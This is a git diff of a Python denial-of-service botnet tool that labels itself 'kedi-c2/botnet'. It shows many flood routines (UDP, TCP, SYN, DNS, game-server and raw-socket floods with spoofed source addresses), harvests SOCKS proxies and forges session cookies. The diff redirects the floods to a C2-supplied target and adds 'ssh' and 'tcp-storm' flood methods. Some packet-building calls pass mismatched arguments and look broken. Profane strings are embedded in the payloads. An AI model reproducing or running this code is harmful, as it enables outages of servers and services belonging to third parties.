@@ -21,6 +21,7 @@ from socks import socksocket , SOCKS5
 from requests import get
 from h2.connection import H2Connection
 from base64 import b64encode
+from re import compile as compilee
 
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
@@ -87,135 +88,135 @@ def wait_for_selector_visible(driver, selector, timeout):
         )
 
 def udp_raw_head(target , port):
-        ip_ver_ihl = 69
-        ip_tos = 0
-        ip_tot_len = 0
-        ip_id = 54321
-        ip_frag_off = 0
-        ip_ttl = 255
-        ip_proto = IPPROTO_UDP
-        ip_check = 0
-        ip_saddr = inet_aton(target)
-        ip_daddr = inet_aton(target)
-        udp_length = 8
-        udp_checksum = 0
-        targetx = target
-        portx = port
-        header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx)
-        return header
+    ip_ver_ihl = 69
+    ip_tos = 0
+    ip_tot_len = 0
+    ip_id = 54321
+    ip_frag_off = 0
+    ip_ttl = 255
+    ip_proto = IPPROTO_UDP
+    ip_check = 0
+    ip_saddr = inet_aton(target)
+    ip_daddr = inet_aton(target)
+    udp_length = 8
+    udp_checksum = 0
+    targetx = target
+    portx = port
+    header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx)
+    return header
 
 def game_udp(target , port):
-        msg = "<==kedi-c2/botnet-on-top-mother-fucker==>"
-        udp_length = 8 + len(msg)
-        pseudo_header_checksum = 0
-        udp_header = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum)
-        s = 0
-        for i in range(0 , len(msg) , 2):
-            w = (msg[i] << 8) + (msg[i+1])
-            s = s + w
-        s = (s >> 16) + (s & 0xffff)
-        s = s + (s >> 16)
-        s = ~s & 0xffff
-        pseudo_header = pack('!4s4sBBH' , target , target , 0 , IPPROTO_UDP , len(msg))
-        pseudo_packet = pseudo_header + msg.encode()
-        udp_hdr_with_checksum = pack('!HHHH' , port , port , len(msg))
-        head = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum , pseudo_packet , udp_header , udp_hdr_with_checksum , pseudo_header , pseudo_packet)
-        return head
+    msg = "<==kedi-c2/botnet-on-top-mother-fucker==>"
+    udp_length = 8 + len(msg)
+    pseudo_header_checksum = 0
+    udp_header = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum)
+    s = 0
+    for i in range(0 , len(msg) , 2):
+        w = (msg[i] << 8) + (msg[i+1])
+        s = s + w
+    s = (s >> 16) + (s & 0xffff)
+    s = s + (s >> 16)
+    s = ~s & 0xffff
+    pseudo_header = pack('!4s4sBBH' , target , target , 0 , IPPROTO_UDP , len(msg))
+    pseudo_packet = pseudo_header + msg.encode()
+    udp_hdr_with_checksum = pack('!HHHH' , port , port , len(msg))
+    head = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum , pseudo_packet , udp_header , udp_hdr_with_checksum , pseudo_header , pseudo_packet)
+    return head
 
 def game_tcp(target  ,  port):
-        ip_h = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 , 54321 , 0 , 255 , SOCK_STREAM , 0 , inet_aton(target) , inet_aton(target))
-        tcp_h = pack('!HHLLBBHHH' , port , port , 0 , 0 , 18 , 0 , 8192 , 0 , 0)
-        return ip_h + tcp_h
+    ip_h = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 , 54321 , 0 , 255 , SOCK_STREAM , 0 , inet_aton(target) , inet_aton(target))
+    tcp_h = pack('!HHLLBBHHH' , port , port , 0 , 0 , 18 , 0 , 8192 , 0 , 0)
+    return ip_h + tcp_h
 
 def r6_gen(target , port):
-        data = "pos_x:120,y:240,shoot"
-        ip_ver_ihl = 69
-        ip_tos = 0
-        ip_tot_len = 0
-        ip_id = 54321
-        ip_frag_off = 0
-        ip_ttl = 255
-        ip_proto = SOCK_DGRAM
-        ip_check = 0
-        ip_saddr = inet_aton(target)
-        ip_daddr = inet_aton(target)
-        udp_length = 8
-        udp_checksum = 0
-        targetx = target
-        portx = port
-        header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx , data)
-        return header
+    data = "pos_x:120,y:240,shoot"
+    ip_ver_ihl = 69
+    ip_tos = 0
+    ip_tot_len = 0
+    ip_id = 54321
+    ip_frag_off = 0
+    ip_ttl = 255
+    ip_proto = SOCK_DGRAM
+    ip_check = 0
+    ip_saddr = inet_aton(target)
+    ip_daddr = inet_aton(target)
+    udp_length = 8
+    udp_checksum = 0
+    targetx = target
+    portx = port
+    header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx , data)
+    return header
 
 class tcpamp:
-        def __init__(self , source_port , dest_port , seq_num , ack_num , data_offset , flags , window_size , checksum , urgent_pointer):
-            self.source_port = source_port
-            self.dest_port = dest_port
-            self.seq_num = seq_num
-            self.ack_num = ack_num
-            self.data_offset = data_offset
-            self.flags = flags
-            self.window_size = window_size
-            self.checksum = checksum
-            self.urgent_pointer = urgent_pointer
+    def __init__(self , source_port , dest_port , seq_num , ack_num , data_offset , flags , window_size , checksum , urgent_pointer):
+        self.source_port = source_port
+        self.dest_port = dest_port
+        self.seq_num = seq_num
+        self.ack_num = ack_num
+        self.data_offset = data_offset
+        self.flags = flags
+        self.window_size = window_size
+        self.checksum = checksum
+        self.urgent_pointer = urgent_pointer
 
-        def pack(self):
-            return pack('!HHLLBBHHH',
-                            self.source_port ,
-                            self.dest_port ,
-                            self.seq_num ,
-                            self.ack_num ,
-                            (self.data_offset << 4) | self.flags ,
-                            self.window_size ,
-                            self.checksum ,
-                            self.urgent_pointer)
+    def pack(self):
+        return pack('!HHLLBBHHH',
+                        self.source_port ,
+                        self.dest_port ,
+                        self.seq_num ,
+                        self.ack_num ,
+                        (self.data_offset << 4) | self.flags ,
+                        self.window_size ,
+                        self.checksum ,
+                        self.urgent_pointer)
 
 class udpxd:
-        def __init__(self, source_port, dest_port, length, checksum, data):
-            self.source_port = source_port
-            self.dest_port = dest_port
-            self.length = length
-            self.checksum = checksum
-            self.data = data
+    def __init__(self, source_port, dest_port, length, checksum, data):
+        self.source_port = source_port
+        self.dest_port = dest_port
+        self.length = length
+        self.checksum = checksum
+        self.data = data
 
-        def pack(self):
-            header = pack('!HHHH' , self.source_port , self.dest_port , self.length , self.checksum)
-            return header + self.data
+    def pack(self):
+        header = pack('!HHHH' , self.source_port , self.dest_port , self.length , self.checksum)
+        return header + self.data
 
 def tcp_paf_data(target , port):
-            source_ip = f"{ran(1, 223)}.{ran(0, 255)}.{ran(0, 255)}.{ran(0, 255)}"
-            source_port = ran(1024, 65535)
-            seq = ran(0 , 4294967295)
-            ack = 0
-            flags = 0x18
-            tcp_header = pack('!HHLLBBHHH' , source_port , port , seq , ack , 5 << 4 , flags , 65535 , 0 , 0)
-            ip_header = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 + len(tcp_header) , 54321 , 0 , 255 , 6 , 0 , inet_aton(source_ip) , inet_aton(target))
-            return ip_header + tcp_header
+    source_ip = f"{ran(1, 223)}.{ran(0, 255)}.{ran(0, 255)}.{ran(0, 255)}"
+    source_port = ran(1024, 65535)
+    seq = ran(0 , 4294967295)
+    ack = 0
+    flags = 0x18
+    tcp_header = pack('!HHLLBBHHH' , source_port , port , seq , ack , 5 << 4 , flags , 65535 , 0 , 0)
+    ip_header = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 + len(tcp_header) , 54321 , 0 , 255 , 6 , 0 , inet_aton(source_ip) , inet_aton(target))
+    return ip_header + tcp_header
 
 def handshaketcp(port):
-        seq = ran(0 , 65535)
-        ack = 0
-        offset_res = (5 << 4) + 0
-        flags = 0x02
-        window = socket.htons(5840)
-        checksum = 0
-        urgent_pointer = 0
-        tcp_header = pack('!HHLLBBHHH' , port , port , seq ,ack , offset_res , flags , window , checksum , urgent_pointer)
-        return tcp_header
+    seq = ran(0 , 65535)
+    ack = 0
+    offset_res = (5 << 4) + 0
+    flags = 0x02
+    window = socket.htons(5840)
+    checksum = 0
+    urgent_pointer = 0
+    tcp_header = pack('!HHLLBBHHH' , port , port , seq ,ack , offset_res , flags , window , checksum , urgent_pointer)
+    return tcp_header
 
 def tcp_connhex(path , target , ua , cookie):
-        payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n"
-        payl_bytes = payl.encode('utf-8')
-        hex_payload = ''.join(f'\\x{b:02x}' for b in payl_bytes)
-        return hex_payload
+    payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n"
+    payl_bytes = payl.encode('utf-8')
+    hex_payload = ''.join(f'\\x{b:02x}' for b in payl_bytes)
+    return hex_payload
 
 
 def get_cookies(driver):
-        cookies = driver.get_cookies()
-        pieces = []
-        for cookie in cookies:
-            cookie_string = cookie["name"] + "=" + cookie["value"]
-            pieces.append(cookie_string)
-        return ";".join(pieces)
+    cookies = driver.get_cookies()
+    pieces = []
+    for cookie in cookies:
+        cookie_string = cookie["name"] + "=" + cookie["value"]
+        pieces.append(cookie_string)
+    return ";".join(pieces)
 
 def socks5geter():
     prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
@@ -274,15 +275,8 @@ def main():
                 thr(target=socks5geter).start()
         except:
             pass
-        
+
         try:
-            def okurl():
-                if url.startswith("http://") or url.startswith("https://"):
-                    pass
-                else:
-                    url = f"http://{url}"
-                    return url
-            okurl()
             us = UserAgent()
             ua = us.random
             ctx = create_default_context(cafile=where())
@@ -297,7 +291,6 @@ def main():
                 characters = ascii_letters + digits
                 fake_phpsessid = ''.join(che(characters) for _ in range(length))
                 return fake_phpsessid
-
             fake_cookie_phpsessid = generate_fake_phpsessid(147)
             fake_cookie_phpsessidd = generate_fake_phpsessid(32)
             response = get(url)
@@ -649,6 +642,10 @@ def main():
                     except:
                         pass
                              
+            try:
+                ip_tt = str(c2.split()[2])
+            except:
+                pass
 
             def udp():
                 while time() < timer:
@@ -656,7 +653,7 @@ def main():
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
                             payl = byt(1024)
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -664,7 +661,7 @@ def main():
                 while time() < timer:
                     try:
                         s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target , port))
+                        s.connect((ip_tt , port))
                         for _ in range(rpc):
                             payl = byt(1024)
                             s.send(payl)
@@ -677,7 +674,7 @@ def main():
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
                             payl = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\00\x00'
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -685,7 +682,7 @@ def main():
                 while time() < timer:
                     try:
                         s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target , port))
+                        s.connect((ip_tt , port))
                         for _ in range(rpc):
                             payl = b"\x6B\x65\x64\x69\x63\x32\x20\x64\x61\x74\x61\x20\x6F\x6E\x74\x6F\x70\x20\x6D\x79\x20\x6F\x77\x6E\x20\x61\x73\x73\x20\x61\x6D\x70\x2F\x74\x72\x69\x70\x68\x65\x6E\x74\x20\x69\x73\x20\x6D\x79\x20\x64\x69\x63\x6B\x20\x61\x6E\x64\x20\x62\x61\x6C\x6C\x73"
                             s.send(payl)
@@ -697,8 +694,8 @@ def main():
                     try:
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
-                            payl = dns_gen(target)
-                            s.sendto(payl , (target , port))
+                            payl = dns_gen(ip_tt)
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -708,7 +705,7 @@ def main():
                         s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
                         s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
                         for _ in range(rpc):
-                            payl = syn_gen(target , port)
+                            payl = syn_gen(ip_tt , port)
                             s.sendto(payl)
                     except:
                         pass
@@ -719,7 +716,7 @@ def main():
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
                             payl = gen_payl()
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -727,7 +724,7 @@ def main():
                 while time() < timer:
                     try:
                         s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target , port))
+                        s.connect((ip_tt , port))
                         for _ in range(rpc):
                             payl = gen_payl()
                             s.send(payl)
@@ -740,7 +737,7 @@ def main():
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
                             payl = gen_payl()
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
             def fiv():
@@ -749,7 +746,7 @@ def main():
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
                             payl = b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10'
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -759,7 +756,7 @@ def main():
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
                             payl = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -768,11 +765,11 @@ def main():
                     try:
                         s1 = socket(AF_INET , SOCK_STREAM)
                         s2 = socket(AF_INET , SOCK_DGRAM)
-                        s1.connect((target , port))
+                        s1.connect((ip_tt , port))
                         for _ in range(rpc):
                             payl = gen_payl()
                             s1.send(payl)
-                            s2.sendto(payl , (target , port))
+                            s2.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -782,8 +779,8 @@ def main():
                         s = socket(AF_INET , SOCK_RAW , IPPROTO_UDP)
                         s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
                         for _ in range(rpc):
-                            payl = udp_raw_head(target , port)
-                            s.sendto(payl , (target , port))
+                            payl = udp_raw_head(ip_tt , port)
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -803,12 +800,12 @@ def main():
                     try:
                         s1 = socket(AF_INET , SOCK_STREAM)
                         s2 = socket(AF_INET , SOCK_DGRAM)
-                        s1.connect((target , port))
+                        s1.connect((ip_tt , port))
                         for _ in range(rpc):
-                            payl1 = game_udp(target , port)
-                            payl2 = game_tcp(target , port)
+                            payl1 = game_udp(ip_tt , port)
+                            payl2 = game_tcp(ip_tt , port)
                             s1.send(payl2)
-                            s2.sendto(payl1 , (target , port))
+                            s2.sendto(payl1 , (ip_tt , port))
                     except:
                         pass
 
@@ -817,8 +814,8 @@ def main():
                     try:
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
-                            payl = r6_gen(target , port)
-                            s.sendto(payl , (target , port))
+                            payl = r6_gen(ip_tt , port)
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -826,7 +823,7 @@ def main():
                 while time() < timer:
                     try:
                         s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target , port))
+                        s.connect((ip_tt , port))
                         for _ in range(rpc):
                             payl = tcpamp(source_port=port , dest_port=port , seq_num=1 , ack_num=0 , data_offset=5 , flags=0x12 , window_size=65535 , checksum=0 , urgent_pointer=0)
                             s.send(payl)
@@ -845,7 +842,7 @@ def main():
                             data = b'<==kedi-c2/botnet-on-top-mother-fucker==>'
                             udp_payload = udpxd(source_port , dest_port , length , checksum , data)
                             payl = udp_payload.pack()
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -856,7 +853,7 @@ def main():
                         for _ in range(rpc):
                             payl = (b"\xF8\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"
                                     b"\x70\x69\x6E\x67\xF8\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-                            s.sendto(payl , (target , port))
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -865,8 +862,8 @@ def main():
                     try:
                         s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
                         for _ in range(rpc):
-                            payl = tcp_paf_data(target , port)
-                            s.sendto(payl , (target , port))
+                            payl = tcp_paf_data(ip_tt , port)
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -879,7 +876,7 @@ def main():
                         ctx.check_hostname = False
                         ctx.verify_mode = CERT_NONE
                         parsed_url = urlparse(url)
-                        target = parsed_url.netloc
+                        ip_tt = parsed_url.netloc
                         path = parsed_url.path
                         if path == "":
                             path = "/"
@@ -896,14 +893,14 @@ def main():
                         if port == 443:
                             s = socket(AF_INET , SOCK_STREAM)
                             s = SSLContext(PROTOCOL_TLSv1_2)
-                            s = ctx.wrap_socket(s , server_hostname=target)
-                            s.connect((target , port))
+                            s = ctx.wrap_socket(s , server_hostname=ip_tt)
+                            s.connect((ip_tt , port))
                         else:
                             s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target , port))
+                            s.connect((ip_tt , port))
                         for _ in range(rpc):
-                            payl = tcp_connhex(path , target , ua , cookie)
-                            s.sendto(payl , (target , port))
+                            payl = tcp_connhex(path , ip_tt , ua , cookie)
+                            s.sendto(payl , (ip_tt , port))
                     except:
                         pass
 
@@ -911,7 +908,7 @@ def main():
                 while time() < timer:
                     try:
                         s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target , port))
+                        s.connect((ip_tt , port))
                         for _ in range(rpc):
                             payl = handshaketcp(port)
                             s.send(payl)
@@ -922,7 +919,7 @@ def main():
                 while True:
                     try:
                         s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target,port))
+                        s.connect((ip_tt,port))
                         for _ in range(rpc):
                             payl = b'\x00\x0b\x00\x00\x00'
                             s.send(payl)
@@ -933,9 +930,34 @@ def main():
                 while True:
                     try:
                         s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target,port))
+                        s.connect((ip_tt,port))
                         for _ in range(rpc):
                             payl = b'\x0e\x00\x00\x00\x00\x00\x00\x00\x00'
+                            s.send(payl)
+                    except:
+                        pass
+
+            def ssh():
+                while True:
+                    try:
+                        s = socket(AF_INET , SOCK_STREAM)
+                        s.connect((ip_tt , port))
+                        for _ in range(rpc):
+                            payl = b"\x53\x53\x48\x2d\x32\x2e\x30\x2d\x4f\x70\x65\x6e\x53\x53\x48"
+                            s.send(payl)
+                    except:
+                        pass
+
+            def tcp_storm():
+                while True:
+                    try:
+                        s = socket(AF_INET , SOCK_STREAM)
+                        s.connect((ip_tt , port))
+                        for _ in range(rpc):
+                            payl = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
+                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
+                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
+                   b'\x73')
                             s.send(payl)
                     except:
                         pass
@@ -1052,6 +1074,12 @@ def main():
             elif method == 'tcp-80':
                 for _ in range(threads):
                     thr(target=tcp_80).start()
+            elif method == 'ssh':
+                for _ in range(threads):
+                    thr(target=ssh).start()
+            elif method == 'tcp-storm':
+                for _ in range(threads):
+                    thr(target=tcp_storm).start()
         except:
             pass
 
